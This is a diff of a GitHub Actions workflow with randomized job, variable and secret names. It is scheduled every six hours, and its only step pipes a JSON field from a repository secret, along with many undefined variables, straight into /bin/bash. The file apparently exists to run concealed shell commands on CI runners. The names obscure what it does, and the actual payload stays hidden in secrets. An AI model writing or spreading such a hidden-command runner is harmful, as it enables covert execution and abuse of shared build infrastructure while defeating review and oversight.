@@ -1,37 +1,34 @@
 name: ruanxiaoer19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
+    - cron: '2 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: ruanxiaoer19871010
         env:
-          afro60: ${{ secrets.afro60 }}
+          nfb946: ${{ secrets.nfb946 }}
         run: |
-          echo $afro60 | jq -r .busq445 | /bin/bash
-          echo $uhzp13 | jq -r .kxwre1476 | /bin/bash
-          echo $gj5 | jq -r .y1099 | /bin/bash
-          echo $b05 | jq -r .tvj94773 | /bin/bash
-          echo $y7 | jq -r .eee4 | /bin/bash
-          echo $nrq57 | jq -r .hlssn19876 | /bin/bash
-          echo $egms4 | jq -r .tcrhn37 | /bin/bash
-          echo $u62 | jq -r .wow762 | /bin/bash
-          echo $wbd64 | jq -r .wwn674 | /bin/bash
-          echo $yoifm895 | jq -r .ay54375 | /bin/bash
-          echo $ludfs3 | jq -r .zvn05041 | /bin/bash
-          echo $zfzhi268 | jq -r .jsku55042 | /bin/bash
-          echo $le6 | jq -r .w5 | /bin/bash
-          echo $aarg2 | jq -r .lsvg21 | /bin/bash
-          echo $qca76527 | jq -r .krno0519 | /bin/bash
-          echo $dq38276 | jq -r .b70 | /bin/bash
-          echo $gfyvc7867 | jq -r .s4 | /bin/bash
-          echo $su436 | jq -r .m83654 | /bin/bash
-          echo $zng05595 | jq -r .zxt5 | /bin/bash
-          echo $ewn44 | jq -r .qdtwl859 | /bin/bash
-          echo $zejvi8449 | jq -r .jv2 | /bin/bash
-          echo $ba5284 | jq -r .kvwz50 | /bin/bash
+          echo $nfb946 | jq -r .s711 | /bin/bash
+          echo $j2213 | jq -r .w44 | /bin/bash
+          echo $i7420 | jq -r .eel87 | /bin/bash
+          echo $uru089 | jq -r .qtgu08 | /bin/bash
+          echo $umjt1 | jq -r .o0342 | /bin/bash
+          echo $pbi3 | jq -r .spgaf31751 | /bin/bash
+          echo $sdaly4 | jq -r .pyanu32869 | /bin/bash
+          echo $ja2337 | jq -r .cag96923 | /bin/bash
+          echo $errq6 | jq -r .b0816 | /bin/bash
+          echo $nhpw71958 | jq -r .w691 | /bin/bash
+          echo $ivcxo79 | jq -r .vcas46760 | /bin/bash
+          echo $y6423 | jq -r .n27 | /bin/bash
+          echo $yhulp66369 | jq -r .eiss72 | /bin/bash
+          echo $zgoi5912 | jq -r .vmc068 | /bin/bash
+          echo $kxkz4737 | jq -r .myqgd2522 | /bin/bash
+          echo $fg4 | jq -r .yivh49 | /bin/bash
 
